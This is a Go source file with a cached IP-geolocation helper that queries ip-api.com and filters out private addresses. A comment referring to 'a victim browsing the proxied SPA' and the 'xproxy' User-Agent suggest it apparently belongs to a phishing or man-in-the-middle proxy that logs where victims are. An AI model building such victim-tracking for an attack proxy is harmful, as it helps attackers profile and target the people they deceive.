package main

import (
	"encoding/json"
	"net/http"
	"strings"
	"sync"
	"time"
)

// geoLookup resolves an IP to country/city using the free ip-api.com endpoint
// (no key required). Results are cached in-memory so repeated hits from the
// same IP (a victim browsing the proxied SPA) don't re-query the API.
type geoLookup struct {
	mu      sync.RWMutex
	cache   map[string]geoResult
	client  *http.Client
	enabled bool
}

type geoResult struct {
	Country string
	City    string
}

func newGeoLookup() *geoLookup {
	return &geoLookup{
		cache:   make(map[string]geoResult),
		client:  &http.Client{Timeout: 3 * time.Second},
		enabled: true,
	}
}

// lookup returns (country, city) for an IP, empty strings on any failure.
func (g *geoLookup) lookup(ip string) (string, string) {
	if g == nil || !g.enabled || ip == "" || isPrivateIP(ip) {
		return "", ""
	}
	g.mu.RLock()
	if r, ok := g.cache[ip]; ok {
		g.mu.RUnlock()
		return r.Country, r.City
	}
	g.mu.RUnlock()

	// ip-api.com free tier: 45 req/min, no key, JSON only.
	req, err := http.NewRequest(http.MethodGet, "http://ip-api.com/json/"+ip+"?fields=status,country,city", nil)
	if err != nil {
		return "", ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (xproxy-geo)")
	resp, err := g.client.Do(req)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()

	var out struct {
		Status  string `json:"status"`
		Country string `json:"country"`
		City    string `json:"city"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return "", ""
	}
	if out.Status != "success" {
		return "", ""
	}

	g.mu.Lock()
	g.cache[ip] = geoResult{Country: out.Country, City: out.City}
	g.mu.Unlock()
	return out.Country, out.City
}

// isPrivateIP reports whether an IP is loopback/private/link-local, for which
// geolocation is meaningless and should be skipped.
func isPrivateIP(ip string) bool {
	ip = strings.TrimSpace(ip)
	if ip == "" {
		return true
	}
	// IPv4 private ranges.
	for _, prefix := range []string{"10.", "192.168.", "172.16.", "172.17.", "172.18.",
		"172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
		"172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "127.",
		"0.", "169.254."} {
		if strings.HasPrefix(ip, prefix) {
			return true
		}
	}
	// IPv6 loopback/link-local/unique-local.
	if strings.Contains(ip, ":") {
		l := strings.ToLower(ip)
		if l == "::1" || strings.HasPrefix(l, "fe80:") || strings.HasPrefix(l, "fc") || strings.HasPrefix(l, "fd") {
			return true
		}
	}
	return false
}
